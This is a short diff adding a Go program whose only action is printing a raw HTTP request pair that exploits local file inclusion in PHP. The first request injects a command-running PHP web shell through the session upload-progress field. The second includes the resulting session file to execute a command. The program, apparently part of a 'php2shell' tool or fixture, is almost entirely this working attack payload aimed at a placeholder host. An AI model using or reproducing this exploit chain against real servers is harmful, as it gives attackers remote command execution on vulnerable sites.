@@ -1,0 +1,3 @@
+package main
+import "fmt"
+func main() { fmt.Print("POST /index.php HTTP/1.1\r\nHost: example.invalid\r\nUser-Agent: Go-http-client/1.1\r\nContent-Type: multipart/form-data; boundary=----php2shell-golang\r\nContent-Length: 372\r\n\r\n------php2shell-golang\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n<?php echo \"PHP2SHELL_XBu4Je\"; system($_GET[\"c\"]); ?>\r\n------php2shell-golang\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\nSUjKIKy3Rr6QsaJ1Ik7Rme8h3n\r\n------php2shell-golang\r\nContent-Disposition: form-data; name=\"f\"; filename=\"probe.txt\"\r\n\r\nZ\r\n------php2shell-golang--\r\nGET /lfi_sink.php?c=id&f=/tmp/sess_SUjKIKy3Rr6QsaJ1Ik7Rme8h3n HTTP/1.1\r\nHost: example.invalid\r\n\r\n") }
